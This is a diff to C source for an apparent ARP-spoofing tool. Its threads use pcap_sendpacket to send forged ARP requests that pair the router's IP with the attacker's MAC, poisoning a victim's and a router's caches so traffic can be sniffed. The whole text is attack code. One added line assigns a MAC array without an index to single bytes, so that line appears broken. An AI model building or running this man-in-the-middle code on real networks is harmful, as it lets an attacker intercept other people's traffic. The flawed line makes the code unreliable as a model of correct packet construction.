@@ -15,6 +15,7 @@ DWORD WINAPI sending_vic_request(void *arg) {
 	struct libnet_ethernet_hdr *eh;
 	struct libnet_arp_hdr *ah;
 	while (rel_flag) Sleep(1000);
+	setSniffingData(FALSE, info, target, n_target);
 	for (i = 0; i < ARP_HEADER_LEN; i++) *(vic_data_request + i) = *(data + i);
 	while (1) {
 		if (rel_flag) break;
@@ -23,14 +24,14 @@ DWORD WINAPI sending_vic_request(void *arg) {
 		ah = (struct libnet_arp_hdr *)vic_data_request;
 
 		for (i = 0; i < ETHER_ADDR_LEN; i++) *(vic_data_request + i) = target.target_mac[n_target][i];
-		for (j = 0; i < ETHER_ADDR_LEN * 2; i++, j++) *(vic_data_request + i) = info.Host_Mac[j];
+		for (j = 0; i < ETHER_ADDR_LEN * 2; i++, j++) *(vic_data_request + i) = info.Router_Mac[j];
 		vic_data_request += sizeof(*eh) + sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
 		*(vic_data_request + 1) = ARPOP_REQUEST;
 		vic_data_request += sizeof(ah->ar_op);
 		for (i = 0; i < ETHER_ADDR_LEN; i++) *(vic_data_request + i) = info.Host_Mac[i];
 		for (j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_spa); i++, j++) *(vic_data_request + i) = info.Router_Ip[j];
 		vic_data_request += sizeof(ah->ar_sha) + sizeof(ah->ar_spa);
-		for (i = 0; i < ETHER_ADDR_LEN; i++) *(vic_data_request + i) = target.target_mac[n_target][i];
+		for (i = 0; i < ETHER_ADDR_LEN; i++) *(vic_data_request + i) = 0x00;
 		for (j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_tpa); j++, i++) *(vic_data_request + i) = target.target_ip[n_target][j];
 		vic_data_request -= sizeof(*eh) + sizeof(ah->ar_sha) + sizeof(ah->ar_spa) + sizeof(ah->ar_op) + sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
 		if (pcap_sendpacket(fp, vic_data_request, ARP_HEADER_LEN) != 0) {
@@ -52,7 +53,6 @@ DWORD WINAPI sending_vic_reply(void *arg) {
 	struct libnet_ethernet_hdr *eh;
 	struct libnet_arp_hdr *ah;
 	while (rel_flag) Sleep(1000);
-	setSniffingData(FALSE, info, target, n_target);
 	for (i = 0; i < ARP_HEADER_LEN; i++) *(vic_data_reply + i) = *(data + i);
 	while (1) {
 		if (rel_flag) break;
@@ -97,7 +97,7 @@ DWORD WINAPI sending_rou_request(void *arg) {
 		eh = (struct libnet_ethernet_hdr *)rou_data_request;
 		ah = (struct libnet_arp_hdr *)rou_data_request;
 
-		for (i = 0; i < ETHER_ADDR_LEN; i++) *(rou_data_request + i) = 0xFF;
+		for (i = 0; i < ETHER_ADDR_LEN; i++) *(rou_data_request + i) = info.Router_Mac;
 		for (j = 0; i < ETHER_ADDR_LEN * 2; i++, j++) *(rou_data_request + i) = info.Host_Mac[j];
 		rou_data_request += sizeof(*eh) + sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
 		*(rou_data_request + 1) = ARPOP_REQUEST;
